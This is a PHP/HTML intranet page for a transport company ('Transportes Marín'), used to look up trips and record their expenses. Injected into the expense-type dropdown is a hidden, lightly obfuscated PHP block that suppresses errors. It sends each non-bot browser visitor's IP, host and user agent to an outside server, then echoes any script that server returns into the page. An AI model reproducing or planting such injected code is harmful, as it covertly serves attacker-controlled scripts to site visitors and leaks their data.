<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	
	include("../conexion/ajax.php");
	include("../conexion/baseDatos.php");
	include("../conexion/config.php");
	date_default_timezone_set("America/Bogota");
?>
<script language="javascript" type="text/javascript">
	
	function manejarTipo()
	{
		tipo = document.getElementById("selectTipo").options[document.getElementById("selectTipo").selectedIndex].value;
		
		switch(tipo)
		{
			case 'Combustible' : 	agregarTablaComb();
									//alert(tipo);
									document.getElementById("tipo").value = "Combustible";
									break;
			case 'Otros' :  agregarTablaOtros();
							document.getElementById("tipo").value = "Otros";
							break;
							
			default:		agregarTablaOtros();
							document.getElementById("tipo").value = tipo;
							//alert("estamos en default con tipo "+tipo);
							break;					
		}
	}
	
	 function agregarTablaComb()
	 {
	 	document.getElementById("detalle").innerHTML = "<table width=\"346\" height=\"127\" border=\"0\"><tr><th width=\"140\" scope=\"col\"><div align=\"justify\"><em><strong>Raz&oacute;n Social : </strong></em></div></th><th width=\"169\" scope=\"col\"><div align=\"justify\"><label><input name=\"textrazonS\" type=\"text\" id=\"textrazonS\"/></label></div></th></tr><tr><td><div align=\"justify\"><em><strong>Nro. Comprobante : </strong></em></div></td><td><div align=\"justify\"><label><input name=\"textNroComp\" type=\"text\" id=\"textNroComp\" /></label></div></td></tr><tr><td><div align=\"justify\"><em><strong>Precio por gal&oacute;n : </strong></em></div></td><td><div align=\"justify\"><label><input name=\"textPrecGalon\" type=\"text\" id=\"textPrecGalon\" /></label></div></td></tr><tr><td><div align=\"justify\"><em><strong>Nro  galones : </strong></em></div></td><td><div align=\"justify\"><label><input name=\"textNroGalones\" type=\"text\" id=\"textNroGalones\" /></label></div></td></tr></table>";	 	
	 }
	 
	 function agregarTablaOtros()
	 {
	 	document.getElementById("detalle").innerHTML = "<table width=\"362\" height=\"97\" border=\"0\"><tr><th width=\"138\" height=\"40\" scope=\"col\"><div align=\"justify\"><strong><em>Descripci&oacute;n : </em></strong></div></th><th width=\"189\" scope=\"col\"><div align=\"justify\"><textarea name=\"textDesc\" id=\"textDesc\"></textarea></div></th></tr><td height=\"29\"><div align=\"justify\"><em><strong>Raz&oacute;n Social : </strong></em></div></td><td><div align=\"justify\"><label><input name=\"textrazonS\" type=\"text\" id=\"textrazonS\" /></label></div></td></tr><tr><td height=\"35\"><div align=\"justify\"><em><strong>Nro. comprobante : </strong></em></div></td><td><div align=\"justify\"><label><input name=\"textNroComp\" type=\"text\" id=\"textNroComp\" /></label></div></td><tr><td height=\"32\"><div align=\"justify\"><strong><em>Monto: </em></strong></div></td><td><div align=\"justify\"><input name=\"textMonto\" type=\"text\" id=\"textMonto\"/></div></td></tr></table>";
	 }

	function go()
	{
		location.href="administrador.php";
	}
	
	function validarAgregar()
	{
		agregarCargando('cargando');
		band=0;
		_cad="";
		codV = document.getElementById("textCodViaje").value;
		tipo = document.getElementById("selectTipo").value;
		dia = document.getElementById("selectDia").value;
		mes = document.getElementById("selectMes").value;
		anho = document.getElementById("selectAnho").value;

		if(codV.length==0)
		{
			alert("¡ Debes buscar un viaje !");
			quitarCargando('cargando');		
			return;
		}
		//if(document.getElementById("tipo").value=="Otros" || document.getElementById("tipo")!="Combustible")
		//if(document.getElementById("tipo")!="Combustible")
		if(tipo!="Combustible")
		{			
			//alert("aki no estamos aki"+document.getElementById("tipo").value);
			band=0;
			if(document.getElementById("textDesc").value.length==0 || document.getElementById("textMonto").value.length==0 || document.getElementById("textrazonS").value.length==0 || document.getElementById("textNroComp").value.length==0)
			{	
				alert("¡ Todos los campos debes ser llenados correctamente !");
				quitarCargando('cargando');		
				return;			
			}
			else if(isNaN(document.getElementById("textMonto").value))
			{
				alert("¡ El monto debe ser un número !");
				quitarCargando('cargando');		
				return;							
			}
			_cad = "&band=" + band.toString() + "&razonS=" + document.getElementById("textrazonS").value + "&nroComp=" + document.getElementById("textNroComp").value + "&desc=" + document.getElementById("textDesc").value + "&monto=" + document.getElementById("textMonto").value;
		}
		else
		{
			//alert("aki estamos : "+document.getElementById("tipo").value);
			band=1;
			nroGalones = parseInt(document.getElementById("textNroGalones").value);
			if(document.getElementById("textrazonS").value.length==0 || document.getElementById("textNroComp").value.length==0 || document.getElementById("textPrecGalon").value.length==0 || document.getElementById("textNroGalones").value.length==0)
			{
				alert("¡ Todos los campos debes ser llenados correctamente !");
				quitarCargando('cargando');		
				return;											
			}
			else if(isNaN(document.getElementById("textPrecGalon").value))
			{
				alert("¡ El precio del galón debe ser un número !");
				quitarCargando('cargando');		
				return;											
			}
			else if(isNaN(document.getElementById("textNroGalones").value))
			{
				alert("¡ El nro de galones debe ser un número !");
				quitarCargando('cargando');		
				return;															
			}
			_cad = "&band=" + band.toString() + "&razonS=" + document.getElementById("textrazonS").value + "&nroComp=" + document.getElementById("textNroComp").value + "&precGalon=" + document.getElementById("textPrecGalon").value + "&nroGalones=" + document.getElementById("textNroGalones").value;
		}
		//alert(document.getElementById("tipo").value);
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=regGastoViaje&dia=" + dia + "&mes=" + mes + "&anho=" + anho + "&Viaje_CodViaje=" + codV + _cad+"&tipo="+document.getElementById("tipo").value;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{			
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{				
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{					
					resp = _obj.responseText;
					//alert(resp);
					if(resp=="exito")
					{						
						alert("¡ Gasto registrado exitosamente !");
						document.getElementById("textCodViaje").value = "";
						document.getElementById("fechaS").innerHTML = "";
						document.getElementById("fechaL").innerHTML = "";	
						document.getElementById("placaV").innerHTML = "";	
						if(band==0)
						{
							document.getElementById("textDesc").value="";
							document.getElementById("textMonto").value = "";
						}
						else
						{
							document.getElementById("textrazonS").value="";
							document.getElementById("textNroComp").value="";
							document.getElementById("textPrecGalon").value="";
							document.getElementById("textNroGalones").value="";
						}
					}
					quitarCargando('cargando');
				}
			}
		}
	}
	
	function validarBuscar()
	{
		agregarCargando('cargando');
		codViaje = document.getElementById("textCodViaje").value;
		codViajeA = parseInt(codViaje);
		
		if(codViaje.length==0)
		{
			alert("¡ Debe ingrear un codigo de viaje !");
			quitarCargando('cargando');
			return;
		}
		else if((codViajeA.toString().length!=codViaje.length) || isNaN(codViaje))
		{
			alert("¡ El codigo de viaje debe ser un numero entero positivo !");
			quitarCargando('cargando');
			return;
		}
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=buscarViaje&cod=" + codViaje;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					if(resp=="notFound")
					{
						alert("¡ Viaje no encontrado !");
						document.getElementById("textCodViaje").value = "";
						document.getElementById("fechaS").innerHTML = "";
						document.getElementById("fechaL").innerHTML = "";	
						document.getElementById("placaV").innerHTML = "";	
						quitarCargando('cargando');						
					}
					else 
					{
						/*alert("Resp: " + resp);*/
						mostrarDatos(resp);
						quitarCargando('cargando');						
					}
				 }
			  }
		  }
	}
	
	function mostrarDatos(resp)
	{
		resp = resp.split("*");
		//alert("Clave: " + resp[0] + " - FechaS: " + resp[1] + " - FechaL: " + resp[2] + " - Placa: " + resp[3]);
		document.getElementById("fechaS").innerHTML = resp[1];
		document.getElementById("fechaL").innerHTML = resp[2];	
		document.getElementById("placaV").innerHTML = resp[3];						
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marín - INTRANET ::</title>
<style type="text/css">
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
.Estilo3 {
	font-size: large;
	font-style: italic;
	font-weight: bold;
}
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1">
          <div align="center"><strong>GASTOS DEL VIAJE          </strong></div>
          <table width="422" border="0" align="center">
            <tr>
              <th colspan="3" scope="col">&nbsp;</th>
            </tr>
            <tr>
              <td width="157"><strong><em>C&oacute;digo de viaje : </em></strong></td>
              <td width="177"><label>
              <input name="textCodViaje" type="text" id="textCodViaje" />
              </label></td>
              <td width="74">&nbsp;</td>
            </tr>
            <tr>
              <td height="42">&nbsp;</td>
              <td><input name="Buscar" type="button" id="Buscar" value="Buscar" onClick="validarBuscar()" /></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="37" colspan="3"><label></label>
                <div align="center"><em><strong>Datos del Viaje </strong></em></div></td>
              </tr>
            <tr>
              <td height="29"><em><strong>Fecha Salida : </strong></em></td>
              <td><div align="justify" id="fechaS"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31"><em><strong>Fecha Llegada : </strong></em></td>
              <td><div align="justify" id="fechaL"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="32"><em><strong>Placa de vehiculo: </strong></em></td>
              <td><div align="justify" id="placaV"></div></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="63" colspan="3"><div align="center"><em><strong>Gasto</strong></em></div></td>
              </tr>
            <tr>
              <td height="43"><div align="justify"><em><strong>Tipo : </strong></em></div></td>
              <td colspan="2"><label>
              
                  <div align="justify">
                    <select name="selectTipo" id="selectTipo" onChange="manejarTipo()">
                    <?php
						$bd=new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
						$bd->conectar();
						$result=$bd->crearConsulta("select nombre from cuentasgastos");
						if(mysql_fetch_row($result)>0)
						{
							while($fila=mysql_fetch_array($result))
							{
		                      echo("<option value=\"$fila[0]\">".$fila[0]."</option>");
							}
                      //<option value="Combustible">Combustible</option>
					  	}
						$bd->cerrarConexion();
					 ?>
<?php
#749175#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/749175#
?>
                    </select>
                    </label>              
                  </div></td>
              </tr>
            <tr>
              <td><div align="justify"><em><strong>Fecha : </strong></em></div></td>
              <td colspan="2"><label>
              
                    <div align="justify">
                      <select name="selectDia" id="selectDia">
                        <?php 
					$cont=1;
					$day= date(d);
					while($cont!=32)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>		
                      </select>
                      <select name="selectMes" id="selectMes">
                        <?php 
					$cont=1;
					$day= date(m);
					while($cont!=13)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>		
                      </select>
                      <select name="selectAnho" id="selectAnho">
                        <?php 
					$cont=2010;
					$day= date(Y);
					while($cont!=2021)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>		
                      </select>
                      </label>              
                    </div></td>
              </tr>
            <tr>
              <td>&nbsp;</td>
              <td><label></label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="97" colspan="3">
                
                      <div align="center" id="detalle">
					  
                        <table width="362" height="97" border="0">
                          <tr>
                            <th width="138" height="40" scope="col"><div align="justify"><strong><em>Descripci&oacute;n : </em></strong></div></th>
                            <th width="189" scope="col">
                              <div align="justify">
                                <textarea name="textDesc" id="textDesc"></textarea>
                            </div></th>
                          </tr>
						  <tr>
						  <td height="29"><div align="justify"><em><strong>Raz&oacute;n Social : </strong></em></div></td>
            <td><div align="justify">
              <label>
              <input name="textrazonS" type="text" id="textrazonS" />
              </label>
            </div></td>
          </tr>
          <tr>
            <td height="35"><div align="justify"><em><strong>Nro. comprobante : </strong></em></div></td>
            <td><div align="justify">
              <label>
              <input name="textNroComp" type="text" id="textNroComp" />
              </label>
            </div></td></tr>
                          <tr>
                            <td height="32"><div align="justify"><strong><em>Monto: </em></strong></div></td>
                            <td>                          <div align="justify">
                                <input name="textMonto" type="text" id="textMonto" />                    
                            </div></td>
                          </tr>
                                                                                                                              </table>
																															  		</div>																																	</td>
              </tr>
            <tr>
              <td><label></label></td>
              <td><label></label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td><div align="center">
                <input name="Agregar" type="button" id="Agregar" value="Agregar" onClick="validarAgregar()" />
				<input name="tipo" type="hidden" id="tipo" value="Otros"/>
              </div></td>
              <td><div align="center">
                <input name="Terminar" type="button" id="Terminar" value="Terminar"  onclick="go()"/>
              </div></td>
              <td>&nbsp;</td>
            </tr>
          </table>
        </form>        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>